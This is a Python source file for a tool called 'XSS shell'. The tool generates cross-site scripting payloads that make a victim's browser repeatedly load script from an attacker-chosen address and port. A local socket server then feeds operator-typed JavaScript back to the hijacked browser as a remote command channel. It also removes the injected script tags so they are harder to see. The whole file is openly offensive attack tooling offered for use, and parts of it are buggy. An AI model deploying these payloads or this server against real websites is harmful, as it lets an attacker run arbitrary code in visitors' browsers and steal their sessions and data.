from os import remove
import threading


try:
    from blessed import Terminal
    from platform import system
    from time import sleep

    import socket
    import sys
    import os
except:
    print('You havent some imports.')
    print("""
        Libs you need:
            | socket
            | blessed
            | time
            | platform
            | sys
            | os
        --------------
    """)
    exit(0)

options = ["* ", "", "", "", "", ""]
optionsValues = ["HTML", "Yes", "No", "", "", "No"]

try:
    if sys.argv[1] == "debug":
        optionsValues[5] = "Yes"
except:
    pass

oldJSpayload = 'setInterval(function(){{with(document)body.appendChild(createElement("script")).src="[IP]:[PORT]"}},1010)'
oldpayload = '<script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="[IP]:[PORT]"}},1010)</script>'
JSpayload = """try{ var i = 0; setInterval(function(){{ var script = document.createElement('script'); script.src = "[IP]:[PORT]"; script.id = "script_"+String(i); document.getElementsByTagName('head')[0].appendChild(script); i += 1; }},1010)} catch(err){ console.log(err) }"""
payload = """<script>try{ var i = 0; setInterval(function(){{ var script = document.createElement('script'); script.src = "[IP]:[PORT]"; script.id = "script_"+String(i); document.getElementsByTagName('head')[0].appendChild(script); i += 1; }},1010)} catch(err){ console.log(err) }</script>"""


class tcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

osName = system()
def clean():
    if osName == "Linux":
        os.system("clear")
    if osName == "Windows":
        os.system("cls")
    
    print(tcolors.OKCYAN+"""
    -------------------------
    |       XSS shell!      |
    -------------------------\n\n
    """+tcolors.ENDC)

def clean2():
    if osName == "Linux":
        os.system("clear")
    if osName == "Windows":
        os.system("cls")
    




def output(text, type):
    if optionsValues[5].lower() == "yes":
        text = str(text)
        if type.lower() == "error":
            print(tcolors.WARNING+tcolors.BOLD+"[DEVMODE]"+tcolors.ENDC+tcolors.FAIL+"[-] "+text+tcolors.ENDC)
        if type.lower() == "info":
            print(tcolors.WARNING+tcolors.BOLD+"[DEVMODE]"+tcolors.ENDC+tcolors.OKCYAN+"[?] "+text+tcolors.ENDC)
        if type.lower() == "warn":
            print(tcolors.WARNING+tcolors.BOLD+"[DEVMODE]"+tcolors.ENDC+tcolors.WARNING+"[!] "+text+tcolors.ENDC)
        if type.lower() == "ok":
            print(tcolors.WARNING+tcolors.BOLD+"[DEVMODE]"+tcolors.ENDC+tcolors.OKGREEN+"[+] "+text+tcolors.ENDC)

def output2(text, type):
    
    text = str(text)
    if type.lower() == "error":
        print(tcolors.FAIL+"[-] "+text+tcolors.ENDC)
    if type.lower() == "info":
        print(tcolors.OKCYAN+"[?] "+text+tcolors.ENDC)
    if type.lower() == "warn":
        print(tcolors.WARNING+"[!] "+text+tcolors.ENDC)
    if type.lower() == "ok":
        print(tcolors.OKGREEN+"[+] "+text+tcolors.ENDC)

def showOptions(page):
    if page == 1:
        print("1. Connect to XSS payload")
        print("2. Generate XSS payload")
        print("3. Help")
        print("4. Settings")
        print("5. Exit")
        return ["1","2","3","4", "5"]

    if page == 2:
        output("Starting shell function...", "info")
        NewShell()
        


    if page == 3:
        output2("Enter a port to connect (Leave blank if none): ", "info")
        port = input()


        output2("Enter an a address to connect: ", "info")
        addr = input()

        output2("Generating...", "info")
        try:
            if optionsValues[0].lower() == "html":
                newPayload = payload.replace("[IP]", addr)
                if port == "":
                    newPayload = newPayload.replace(":[PORT]", port)
                    output("Port removed from payload.", "info")
                else:
                    newPayload = newPayload.replace("[PORT]", port)
            else:
                if optionsValues[0].lower() == "js":
                    newPayload = JSpayload.replace("[IP]", addr)
                    if port == "":
                        newPayload = newPayload.replace(":[PORT]", port)
                        output("Port removed from payload.", "info")
                    else:
                        newPayload = newPayload.replace("[PORT]", port)
                else:
                    output("Payload type "+optionsValues[0]+" not found.", "error")
                    print("Error! Unknow payload type! Setting default...")
                    optionsValues[0] = "HTML"

                    showOptions(3)
                    return 0
        except:
            output2("----------------------------------", "error")
            output2("    Failed to generate! ;-(","error")
            output2("----------------------------------","error")
            return -1
        output2("\n\n----------------------------------","ok")
        output2("            Generated!", "ok")
        output2("        ------------------\n\n", "ok")
        
        print(newPayload,"ok")
        output2("\n----------------------------------\n\n", "ok")
        return [addr, port, newPayload]

    if page == 4:
        print("""
        -----------------------------------------------------
        |               HELP                                |
        |        1.Connect to XSS payload                   |
        |    Just to connect XSS payload. The port          |
        |    must be same.                                  |
        |                                                   |
        |        2.Generate XSS payload                     |
        |    Generates a XSS payload.                       |
        |    Address must be global.                        |
        |    Remember port.                                 |
        |                                                   |
        |        3.Help                                     |
        |    Its what you reading now.                      |
        |                                                   |
        |        4.Settings                                 |
        |    Edit program settings.                         |
        |                                                   |
        |         5.Exit                                    |
        |     Exit ;-)                                      |
        |                                                   |
        -----------------------------------------------------    
        
            """)
    if page == 5:
        
        print(f"""
        ------------[SETTINGS]------------

            {options[0]}Payload generation style: {optionsValues[0]}
            {options[1]}Print HTML requests: {optionsValues[1]}
            {options[2]}Use proxy[DEV]: {optionsValues[2]}
            {options[3]}Proxy IP: {optionsValues[3]}
            {options[4]}Proxy Port: {optionsValues[4]}
            {options[5]}Dev mode: {optionsValues[5]}

        ----------------------------------
        """)
        
    if page == 6:
        output2("Exiting... Bye! ;-)", "ok")
        try:
            sleep(1)
        except:
            pass
        clean2()
        sys.exit(0)
    return 0



def startEditingSettings():
    global options
    global optionsValues
    index = 0
    inp = ''
    
    ind = 0
    while ind <= len(options)-1:
            options[ind] = ""
            ind += 1
    options[0] = "* "
    lstIndex = 0
    term = Terminal()
    showOptions(5)
    with term.cbreak():
        output2("\n         Use arrows to control Press q to exit. \n", "info")
        while inp.lower() != 'q':
            
            


            inp = term.inkey()
            if inp.name == "KEY_DOWN":
                lstIndex = index
                index += 1
                if index > len(options)-1:
                    index -= 1
                    
                
                options[lstIndex] = ""
                options[index] = "* "
                clean()
                showOptions(5)
                if optionsValues[5].lower() == "yes":
                    print(tcolors.WARNING+f"""
                    ------[DEV]------
                    |       {index}       |
                    -----------------
                    """+tcolors.ENDC)

            if inp.name == "KEY_RIGHT":
                output2("Enter value: ", "ok")
                value = input()
                optionsValues[options.index("* ")] = value
                clean()
                showOptions(5)

                if optionsValues[5].lower() == "yes":
                    print(tcolors.WARNING+f"""
                    ------[DEV]------
                    |       {index}       |
                    -----------------
                    """+tcolors.ENDC)

                
            if inp.name == "KEY_UP":
                lstIndex = index
                index -= 1
                if index < 0:
                    index = 0
                   
                
                options[lstIndex] = ""
                options[index] = "* "
                

                clean()
                showOptions(5)

                if optionsValues[5].lower() == "yes":
                    print(tcolors.WARNING+f"""
                    ------[DEV]------
                    |       {index}       |
                    -----------------
                    """+tcolors.ENDC)
        
                
        clean()
                
            
        

def Start():
    print(tcolors.OKCYAN+"""
    -------------------------
    | Welcome to XSS shell! |
    -------------------------\n\n
    """+tcolors.ENDC)
    output("Entering loop...", "info")
    while True:
        output2("Choose an option:", 'info')
        options = showOptions(1)
        while True:
            option = input("OPTION>>")
            if option in options:
                pass
            else:
                output2("Not found in list!", 'error')
                break
    
            showOptions(int(option)+1)
            if int(option)+1 == 5:
                clean()
                startEditingSettings()
            option = -1
            break


def SendCommand(cmd, connection, sock, inThread):
    
    try:
        connection.send('HTTP/1.0 200 OK\n'.encode("utf-8"))
        if not inThread:
            output("Sended HTTP:200", 'Ok')
        connection.send('Content-Type: application/javascript\n'.encode("utf-8")) 
        if not inThread:
            output("Sended ContentType", 'Ok')   
        connection.send('\n'.encode("utf-8"))  
        connection.send("""        
        [CMD]  
        """.replace("[CMD]", cmd).encode("utf-8"))
        if not inThread:
            output("Sended CMD!", 'Ok')
        connection.close()
    except Exception as e:
        if not inThread:
            output2("Connection refused.", "Error")
            output("Failed to send: "+str(e), "Error")




def CreateServer(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("127.0.0.1",int(port)))
        output("Successfully created socket.", "Ok")
        return sock
    except KeyboardInterrupt:
                clean()
                output2("KeyboardInterrupt detected!", "warn")
                try:
                    sock.close()
                except:
                    output("Failed to close socket.", "error")
                    exit(0)
                output("Socket closed!", 'info')
                exit(0)
    except Exception as e:
        try:
            output(str(e), "error")
            output2("Error occupted while creating server! \n "+str(e), 'Error')
            sleep(1)
        except KeyboardInterrupt:
                    clean()
                    output2("KeyboardInterrupt detected!", "warn")
                    
                    try:
                        sock.close()
                        output("Socket closed!", 'info')
                    except:
                        pass
                    exit(0)
        return -1
    



        
def Listen(sock, port):
    try:
                output("Listening on port: "+str(port), "Ok")
                sock.listen(1)
                
    except KeyboardInterrupt:
                    clean()
                    output2("KeyboardInterrupt detected!", "warn")
                    try:
                        conn.close()
                    except:
                        pass
                    
                    output("Connection closed!", 'info')
                    try:
                        sock.close()
                    except:
                        pass
                    output("Socket closed!", 'info')

                    exit(0)
    except Exception as e:
                try:
                    output2("Listening failed! Retrying...", 'Error')
                    output("Error occupted while listening:"+str(e), 'Error')
                    sleep(1)
                except KeyboardInterrupt:
                    exit(0)


isEditing = False

RemovingTrash = True
__Remove__ = True
def ConnectionListen(port, sock):
    global RemovingTrash
    global __Remove__
    __Remove__ = True
    RemovingTrash = True
    i = 0
    commands = """"""
    while __Remove__:
        while RemovingTrash:
            output("Trash collected.", "info")
            if __Remove__:
                pass
            else:
                return 0
            conn, addr = sock.accept()
            conn.recv(1000)
            commands += f"""document.getElementById('script_{i}').remove()\n"""
            SendCommand(commands, conn,sock, True)
            conn.close()
            i += 1
        output("Trash collector disabled.", "warn")
    return 0

def NewShell():
    try:
        global RemovingTrash

        output2("Enter port:", "info")
        port = int(input())
        output2("Creating server...", "info")
        while True:
            sock = CreateServer(port)
            if sock == -1:
                output("Server creating error.", "error")
            else:
                output("Successful!", "ok")
                break
    
        output2("Server created, we now listening for connections...", "info")
        Listen(sock, port)
        th1 = threading.Thread(target=ConnectionListen, args=[port,sock])
        th1.start()
        while True:
            command = input("\nExecute -> ")
            if command == "..shell:exit":
                        output("Got exit command.", "info")
                        
                        conn.close()
                        sock.close()
                        
                        output("Closed socket and connection.", "info")
                        return 1
            if command == "..":
                        output2("You now in multiple string mode! Use ctrl+c to enter.", "warn")
                        finalCmd = ""
                        isEditing = True
                        while True:
                            try:
                                newstr = input(">")
                                finalCmd += newstr+"\n"
                                output("String saved", "info")
                            except KeyboardInterrupt:
                                output2("Ended editing...", 'warn')
                                command = finalCmd
                                finalCmd = ""
                                sleep(1)
                                isEditing = False
                                break
                        output("Ended loop!", 'info')
            RemovingTrash = False
            try:
                conn.close()
                output("Closed last connection.", 'info')
            except:
                pass
            try:
                conn, addr = sock.accept()
                conn.recv(1000)

                SendCommand(command,conn,sock, False)
                conn.close()
                output2("Successfuly sent!", "ok")

            except:
                pass
            RemovingTrash = True 
    except KeyboardInterrupt:
        output("\nKeyboard Interrupt!", "warn")
        RemovingTrash = False
        __Remove__ = False
    except:
        output("\nError occupted.", "Error")
        RemovingTrash = False
        __Remove__ = False
        
    
        





def StartShell():
    output2("Enter port: ", "info")
    port = int(input())

    output2("Creating server...", "info")
    while True:
        sock = CreateServer(port)
        if sock == -1:
            output("Server creating error.", "error")
        else:
            output("Successful!", "ok")
            break

    output2("Server created, we now listening for connection...", "info")
    while True:
        try:
            output("Listening on port: "+str(port), "Ok")
            sock.listen(1)
            break
        except KeyboardInterrupt:
                clean()
                output2("KeyboardInterrupt detected!", "warn")
                try:
                    conn.close()
                except:
                    pass
                
                output("Connection closed!", 'info')
                try:
                    sock.close()
                except:
                    pass
                output("Socket closed!", 'info')
                
                exit(0)
        except Exception as e:
            try:
                output2("Listening failed! Retrying...", 'Error')
                output("Error occupted while listening:"+str(e), 'Error')
                sleep(1)
            except KeyboardInterrupt:
                break
    
    try:
        conn,addr = sock.accept()
    except KeyboardInterrupt:
                    clean()
                    output2("KeyboardInterrupt detected!", "warn")
                    try:
                        conn.close()
                        output("Connection closed!", 'info')
                    except:
                        pass
                    try:
                        sock.close()
                        output("Socket closed!", 'info')
                    except:
                        pass
                    exit(0)

    output("Got new connection from "+str(addr)+".", "info")
    try:
        inpt = conn.recv(1000)
    except KeyboardInterrupt:
                clean()
                output2("KeyboardInterrupt detected!", "warn")
                conn.close()
                output("Connection closed!", 'info')
                sock.close()
                output("Socket closed!", 'info')
                exit(0)
    output("Got GET request from "+str(addr)+".", "info")
    output2("Send command to shell:", "info")
    while True:
        while True:
            if optionsValues[1].lower() == "yes":
                splitted = inpt.decode("utf-8").split("\n")
                output("Decoded GET request.", "info")
                output2("\n\n\n    NEW HTTP REQUEST:    \n\n\n", "info")
                output2("-------------------------------------------------\n\n\n", "info")
                for i in splitted:
                    output2(i,"info")
                output2("-------------------------------------------------\n\n\n", "info")
            else:
                output("Skipped output because 'show HTML respond' set to 'No'.", "info")
            try:
                shellCmd = input("XSS>>")
                if shellCmd == "..shell:exit":
                    output("Got exit command.", "info")
                    conn.close()
                    sock.close()
                    output("Closed socket and connection.", "info")
                    return 1
                if shellCmd == "..":
                    output2("You now in multiple string mode! Use ctrl+c to enter.", "warn")
                    finalCmd = ""
                    isEditing = True
                    while True:
                        try:
                            newstr = input(">")
                            finalCmd += newstr+"\n"
                            output("String saved", "info")
                        except KeyboardInterrupt:
                            output2("Ended editing...", 'warn')
                            shellCmd = finalCmd
                            finalCmd = ""
                            sleep(1)
                            isEditing = False
                            break
                    output("Ended loop!", 'info')
                SendCommand(shellCmd, conn, sock, False)
                output("Sended command.", "info")
                output2("Sended!", "info")
            
                output2("Listening for another connection from shell...", "info")
            except KeyboardInterrupt:
                if not isEditing:
                    
                    clean()
                    output2("KeyboardInterrupt detected!", "warn")
                    conn.close()
                    output("Connection closed!", 'info')
                    sock.close()
                    output("Socket closed!", 'info')
                    exit(0)
            except Exception as e:
                output("Error: "+str(e), "error")
            try:
                conn,addr = sock.accept()
                inpt = conn.recv(1000)
                output("Successfuly connected to:"+str(addr), "Ok")
                output2("Got it!", "Ok")

            except KeyboardInterrupt:
                clean()
                output2("KeyboardInterrupt detected!", "warn")
                conn.close()
                output("Connection closed!", 'info')
                sock.close()
                output("Socket closed!", 'info')
                exit(0)
            except Exception as e:
                output2("Failed to connect!", "Error")
                output("Error occupted: "+str(e))
            break





if __name__ == "__main__":
    clean2()
    output("Looks like the program running in main thread.","info")
    output("Access granted.", "ok")
    output("All imports correct!", "Ok")
    output("Cleaned screen.", "info")
    
    output("Starting function 'Start()'","info")
    Start()
else:
    try:
        output2("[-] Program not ran in main thread! >:(", "error")
    except:
        print("[-] Program not ran in main thread! >:(")